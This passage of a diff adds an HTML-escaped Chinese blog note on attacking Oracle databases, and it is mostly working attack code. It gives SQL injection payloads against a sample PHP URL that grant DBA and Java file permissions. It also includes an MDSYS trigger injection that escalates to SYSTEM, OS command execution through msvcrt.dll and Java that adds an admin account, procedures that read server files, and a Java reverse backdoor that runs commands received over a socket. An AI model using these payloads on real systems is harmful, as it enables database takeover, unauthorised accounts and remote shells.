+DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);&amp;nbsp;&amp;nbsp;
+END;&amp;nbsp;&amp;nbsp;`&lt;/pre&gt;&lt;div&gt;
+&lt;/div&gt;&lt;span style=&quot;color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: rgb(255, 255, 255);&quot;&gt;create procedure权限才能利用：（&lt;/span&gt;&lt;span style=&quot;color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: rgb(255, 255, 255);&quot;&gt;11g就没有测试成功&lt;/span&gt;&lt;span style=&quot;color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: rgb(255, 255, 255);&quot;&gt;）&lt;/span&gt;&lt;div&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`web: http://www.hellove.net/hellove.php?id=123 and dbms_xmlquery.newcontext(&apos;declare PRAGMA AUTONOMOUS_TRANSACTION;
+ begin execute immediate &apos;&apos;create or replace function myjava return number is PRAGMA AUTONOMOUS_TRANSACTION;
+ begin execute immediate &apos;&apos;&apos;&apos;DECLARE POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;CURSOR C1 IS 
+ SELECT &apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;GRANT&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;,USER(), &apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;SYS&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;,&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;java.io.FilePermission&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;,
+ &apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&amp;amp;lt;&amp;amp;lt;ALL FILES&amp;amp;gt;&amp;amp;gt;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;,&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;execute&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;,&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;ENABLED&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos; from dual;BEGIN OPEN C1;
+ FETCH C1 BULK COLLECT INTO POL;CLOSE C1;DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);END;&apos;&apos;&apos;&apos;;commit;return 1;end;&apos;&apos;; 
+ commit; end;&apos;) is not null
+
+web: http://www.hellove.net/hellove.php?id=123 and myjava()=1`&lt;/pre&gt;
+&lt;div style=&quot;color:gray&quot;&gt;
+
+需要有create procedure的权限
+&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`web: http://www.hellove.net/hellove.php?id=123 and (select dbms_xmlquery.newcontext(&apos;declare PRAGMA AUTONOMOUS_TRANSACTION;&amp;nbsp;&amp;nbsp;
+begin execute immediate &apos;&apos;create or replace function get_dba return varchar2 authid current_user is PRAGMA&amp;nbsp;&amp;nbsp;
+autonomous_transaction;BEGIN execute immediate &apos;&apos;&apos;&apos;grant dba to hellove&apos;&apos;&apos;&apos;;commit;return &apos;&apos;&apos;&apos;z&apos;&apos;&apos;&apos;;END; &apos;&apos;; commit; end;&apos;)&amp;nbsp;&amp;nbsp;
+from dual) is not null
+
+web :http://www.hellove.net/hellove.php?id=123 and (select dbms_xmlquery.newcontext(&apos;declare PRAGMA&amp;nbsp;&amp;nbsp;
+AUTONOMOUS_TRANSACTION;begin sys.lt.findricset(&apos;&apos;A.A&apos;&apos;&apos;&apos;||hellove.get_dba)--&apos;&apos;,&apos;&apos;BBBB&apos;&apos;);commit;end;&apos;) from dual) is not&amp;nbsp;&amp;nbsp;
+null`&lt;/pre&gt;&lt;div&gt;
+&lt;/div&gt;&lt;small&gt;&lt;small&gt;&amp;nbsp;&lt;/small&gt;&lt;/small&gt;&lt;/div&gt;&lt;small&gt;&lt;small&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot; style=&quot;font-size: 12pt;&quot;&gt;&amp;nbsp;利用MDsys权限 的trigger在system权限下执行命令&lt;/span&gt;&lt;/small&gt;&lt;/small&gt;&lt;/div&gt;&lt;div&gt;&lt;font size=&quot;3&quot;&gt;&lt;span style=&quot;line-height: 24px;&quot;&gt;
+&lt;/span&gt;&lt;/font&gt;&lt;div style=&quot;color:gray&quot;&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`create or replace procedure g(v varchar2) authid current_user is&amp;nbsp;&amp;nbsp;
+PRAGMA AUTONOMOUS_TRANSACTION;&amp;nbsp;&amp;nbsp;
+stmt varchar2(400) := &apos;create or replace trigger &apos;&amp;nbsp;&amp;nbsp;
+|| &apos;system.evil_trigger &apos;&amp;nbsp;&amp;nbsp;
+|| &apos;before insert on &apos;&amp;nbsp;&amp;nbsp;
+|| &apos;system.OL$ &apos;&amp;nbsp;&amp;nbsp;
+|| &apos;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;&apos;&amp;nbsp;&amp;nbsp;
+|| &apos;BEGIN execute immediate &apos;&apos;grant dba to hellove&apos;&apos;;END evil_trigger;&apos;;&amp;nbsp;&amp;nbsp;
+begin&amp;nbsp;&amp;nbsp;
+execute immediate stmt;&amp;nbsp;&amp;nbsp;
+commit;&amp;nbsp;&amp;nbsp;
+end; `&lt;/pre&gt;
+&lt;div&gt;
+
+我们先创建一个过程g（名字要短）,方便注射到MDSYS.SDO_DROP_USER_BEFORE中，然后将g的执行权限赋给public，在过程g中，我们创建 一个在system模式OL$的trigger，代码如上
+&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`drop user &quot;g&apos;);hellove.g(&apos;&quot;;&amp;nbsp;&amp;nbsp;
+insert into system.OL$(OL_NAME) values(&apos;test&apos;);&amp;nbsp;&amp;nbsp;
+set role dba
+`&lt;/pre&gt;
+
+删除用户将触发触发器MDSYS.sdo_drop_user_before，注入代码以MDSYS模式下执行，而MDSYS可以create any trigger，所以我们利用MDSYS 创建system.OL$下的一个trigger，之所以是system.OL$，是因为public用户可以往里面插入数据而触发触发器，然后由于触发器是以definer来 运行的，所以创建的system.evil_trigger就以sysem的权限下加用户了,以上代码还是可以结合dbms_xmlquery.getxml来使用，请自行构造
+&lt;div&gt;
+&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot; style=&quot;font-size: 16pt;&quot;&gt;**执行命令：**&lt;/span&gt;&lt;/div&gt;&lt;small&gt;&lt;small&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot; style=&quot;font-size: 12pt;&quot;&gt;&amp;nbsp;1.&amp;nbsp;&lt;/span&gt;&lt;/small&gt;&lt;/small&gt;&lt;span style=&quot;font-size: 10.5pt; color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: rgb(255, 255, 255);&quot;&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot; style=&quot;font-size: 12pt;&quot;&gt;oracle 10gr2&lt;/span&gt;&lt;/span&gt;&lt;font size=&quot;1&quot;&gt;&lt;span style=&quot;line-height: 14px;&quot;&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot; style=&quot;font-size: 12pt;&quot;&gt;以前&lt;/span&gt;&lt;/span&gt;&lt;/font&gt;&lt;/div&gt;&lt;div style=&quot;color:gray&quot;&gt;&lt;span style=&quot;color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: rgb(255, 255, 255);&quot;&gt;&amp;nbsp;2\. $ORACLE_HOME\bin\下压根就没msvcrt.dll，&quot;c:\windows\system32\msvcrt.dll&quot;或者&quot;……\windows\system32\msvcrt.dll”来执行command的&lt;/span&gt;&lt;font size=&quot;1&quot;&gt;&lt;span style=&quot;line-height: 14px;&quot;&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot; style=&quot;font-size: 12pt;&quot;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/font&gt;&lt;/div&gt;&lt;div style=&quot;color:gray&quot;&gt;&lt;font size=&quot;1&quot;&gt;&lt;span style=&quot;line-height: 14px;&quot;&gt;
+&lt;/span&gt;&lt;/font&gt;&lt;/div&gt;&lt;div&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`create or replace library exec_shell as &apos;$ORACLE_HOME\bin\msvcrt.dll&apos;;&amp;nbsp;&amp;nbsp;
+create or replace procedure execmd (command in char) is external name &quot;system&quot; library exec_shell language c;&amp;nbsp;&amp;nbsp;
+/
+
+exec execmd(&apos;net user &amp;gt; hellove.txt&apos;);`&lt;/pre&gt;&lt;div style=&quot;color:gray&quot;&gt;&lt;span style=&quot;font-size: 12px; line-height: 17px;&quot;&gt;可以复制mdvcrt.dll 到指定目录使用上面语句。&lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;color:gray&quot;&gt;&lt;span style=&quot;font-size: 12px; line-height: 17px;&quot;&gt;
+&lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;color:gray&quot;&gt;&lt;span style=&quot;font-size: 12px; line-height: 17px;&quot;&gt;利用java执行cmd&lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;color:gray&quot;&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`create or replace and resolve java source named JAVACMD as&amp;nbsp;&amp;nbsp;
+import java.lang.&amp;#42;&amp;nbsp;&amp;nbsp;
+import java.io.&amp;#42;&amp;nbsp;&amp;nbsp;
+public class JAVACMD&amp;nbsp;&amp;nbsp;
+{&amp;nbsp;&amp;nbsp;
+public static void execmd(String command) throws IOException&amp;nbsp;&amp;nbsp;
+{&amp;nbsp;&amp;nbsp;
+Runtime.getRuntime().exec(command);&amp;nbsp;&amp;nbsp;
+}&amp;nbsp;&amp;nbsp;
+}
+
+create or replace procedure MYJAVACMD(command in varchar) as language java&amp;nbsp;&amp;nbsp;
+name &apos;JAVACMD.execmd(java.lang.String)&apos;;`&lt;/pre&gt;
+&lt;div&gt;
+
+不过在执行这个MYJAVACMD之前必须将相应的JAVA权限赋予用户，之前提到的DBMS_JVM_EXP_PERMS就可以给用户赋予任意java权限，简单起见，我们直接赋予
+&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`exec dbms_java.grant_permission( &apos;HELLOVE&apos;, &apos;SYS:java.io.FilePermission&apos;, &apos;&amp;lt;&amp;lt;ALL FILES&amp;gt;&amp;gt;&apos;, &apos;execute&apos; );&amp;nbsp;&amp;nbsp;
+exec MYJAVACMD(&apos;net user&apos;);`&lt;/pre&gt;
+&lt;div&gt;
+
+dbms_xmlquery.newcontext来在web下使用
+&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`web: http://www.hellove.net/hellove.php?id=123 and (select dbms_xmlquery.newcontext(&apos;declare PRAGMA AUTONOMOUS_TRANSACTION;&amp;nbsp;&amp;nbsp;
+begin execute immediate &apos;&apos;create or replace and resolve java source named JAVACMD as import java.lang.&amp;#42;import java.io.&amp;#42;public&amp;nbsp;&amp;nbsp;
+class JAVACMD{public static void execmd(String command) throws IOException{Runtime.getRuntime().exec(command);}} &apos;&apos;; commit;&amp;nbsp;&amp;nbsp;
+end;&apos;) from dual) is not null
+
+web: http://www.hellove.net/hellove.php?id=123 and (select dbms_xmlquery.newcontext(&apos;declare PRAGMA AUTONOMOUS_TRANSACTION;&amp;nbsp;&amp;nbsp;
+begin execute immediate &apos;&apos;create or replace procedure MYJAVACMD(command in varchar) as language java name&amp;nbsp;&amp;nbsp;
+&apos;&apos;&apos;&apos;JAVACMD.execmd(java.lang.String)&apos;&apos;&apos;&apos;; &apos;&apos;; commit;end;&apos;) from dual) is not null
+
+web :http://www.hellove.net/hellove.php?id=123 and (select dbms_xmlquery.newcontext(&apos;begin myjavacmd(&apos;&apos;net user admin admin /add&apos;&apos;)&amp;nbsp;&amp;nbsp;
+;commit;end;&apos;) from dual) is not null`&lt;/pre&gt;&lt;div&gt;
+&lt;/div&gt;&lt;small&gt;&lt;small&gt;&amp;nbsp;&lt;/small&gt;&lt;/small&gt;&lt;span style=&quot;font-size: 10.5pt; color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: rgb(255, 255, 255);&quot;&gt;利用pl/sql来读取文件：&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`create or replace procedure read_file(dirname varchar2,fname varchar2) as&amp;nbsp;&amp;nbsp;
+FD utl_file.file_type;&amp;nbsp;&amp;nbsp;
+buffer varchar2(200);&amp;nbsp;&amp;nbsp;
+begin&amp;nbsp;&amp;nbsp;
+execute immediate &apos;create or replace directory rw_file as &apos;&apos;&apos;||dirname||&apos;&apos;&apos;&apos;;&amp;nbsp;&amp;nbsp;
+FD := utl_file.fopen(&apos;RW_FILE&apos;,fname,&apos;r&apos;);&amp;nbsp;&amp;nbsp;
+dbms_output.enable(100000);&amp;nbsp;&amp;nbsp;
+loop&amp;nbsp;&amp;nbsp;
+sys.utl_file.get_line(FD,buffer);&amp;nbsp;&amp;nbsp;
+dbms_output.put_line(buffer);&amp;nbsp;&amp;nbsp;
+end loop;&amp;nbsp;&amp;nbsp;
+execute immediate &apos;drop directory rw_file&apos;;
+
+exception&amp;nbsp;&amp;nbsp;
+when NO_DATA_FOUND then&amp;nbsp;&amp;nbsp;
+dbms_output.put_line(&apos;---|---|---|file end!---|---|---|---|&apos;);&amp;nbsp;&amp;nbsp;
+when others then&amp;nbsp;&amp;nbsp;
+dbms_output.put_line(&apos;please check your file&apos;);&amp;nbsp;&amp;nbsp;
+end read_file;&amp;nbsp;&amp;nbsp;
+/&amp;nbsp;&amp;nbsp;
+exec read_file(&apos;c:\&apos;,&apos;boot.ini&apos;);&amp;nbsp;&amp;nbsp;
+`&lt;/pre&gt;
+
+上面是PL/SQL代码来读取文件，下面是利用JAVA来读取文件内容
+&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`create or replace and compile java source named javareadfile as&amp;nbsp;&amp;nbsp;
+import java.lang.&amp;#42;&amp;nbsp;&amp;nbsp;
+import java.io.&amp;#42;&amp;nbsp;&amp;nbsp;
+public class javareadfile&amp;nbsp;&amp;nbsp;
+{&amp;nbsp;&amp;nbsp;
+public static void readfile(String filename) throws IOException&amp;nbsp;&amp;nbsp;
+{&amp;nbsp;&amp;nbsp;
+FileReader f = new FileReader(filename);&amp;nbsp;&amp;nbsp;
+BufferedReader fr = new BufferedReader(f);&amp;nbsp;&amp;nbsp;
+String text = fr.readLine();&amp;nbsp;&amp;nbsp;
+while(text != null)&amp;nbsp;&amp;nbsp;
+{&amp;nbsp;&amp;nbsp;
+System.out.println(text);&amp;nbsp;&amp;nbsp;
+text = fr.readLine();&amp;nbsp;&amp;nbsp;
+}&amp;nbsp;&amp;nbsp;
+fr.close();&amp;nbsp;&amp;nbsp;
+}&amp;nbsp;&amp;nbsp;
+}
+
+create or replace procedure jreadfile (filename in varchar)&amp;nbsp;&amp;nbsp;
+as language java&amp;nbsp;&amp;nbsp;
+name &apos;javareadfile.readfile(java.lang.String)&apos;;
+
+exec jreadfile(&apos;c:\boot.ini&apos;);
+`&lt;/pre&gt;
+
+我们还是可以利用之前的那个DBMS_JVM_EXP_PERMS获取java.io.FilePermission，可以简单读取文件
+&lt;div&gt;
+&lt;/div&gt;**&amp;nbsp;访问网络**&lt;/div&gt;
+
+在PL/SQL中我们可以利用oracle自带的那几个包(utl_tcp,utl_http…etc)来访问网络，自我感觉不怎么好用，比较喜欢用java， 下面我们来实现一个简易的java版本反向后门
+&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`create or replace and compile java source named javasocket as&amp;nbsp;&amp;nbsp;
+import java.net.&amp;#42;&amp;nbsp;&amp;nbsp;
+import java.io.&amp;#42;&amp;nbsp;&amp;nbsp;
+import java.lang.&amp;#42;
+
+public class javasocket&amp;nbsp;&amp;nbsp;
+{&amp;nbsp;&amp;nbsp;
+public static void test(String addr,String str_port)&amp;nbsp;&amp;nbsp;
+{&amp;nbsp;&amp;nbsp;
+Socket socket;&amp;nbsp;&amp;nbsp;
+String len;&amp;nbsp;&amp;nbsp;
+String s;&amp;nbsp;&amp;nbsp;
+InputStream Is;&amp;nbsp;&amp;nbsp;
+OutputStream Os;&amp;nbsp;&amp;nbsp;
+DataInputStream DIS;&amp;nbsp;&amp;nbsp;
+PrintStream PS;
+
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;try{ 
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;socket=new Socket(addr,Integer.parseInt(str_port)); 
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Is=socket.getInputStream(); 
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Os=socket.getOutputStream(); 
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;DIS=new DataInputStream(Is); 
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;PS=new PrintStream(Os); 
+
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;while(true){ 
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;s=DIS.readLine();
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if(s.trim().equals(&quot;BYE&quot;))break;
+
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;try{
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Runtime rt = Runtime.getRuntime();
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Process p = null;
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;p = rt.exec(s);
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;s = null;
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;String msg = null;
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;while((msg = br.readLine())!=null){
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;msg += &quot;\n&quot;;
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;s += msg;
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;br.close();
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;catch(Exception e)
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{ 
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;s = &quot;Please check your command!&quot;;
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;} 
+
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;PS.println(s);
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; } 
+
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;DIS.close();
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;PS.close(); 
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Is.close(); 
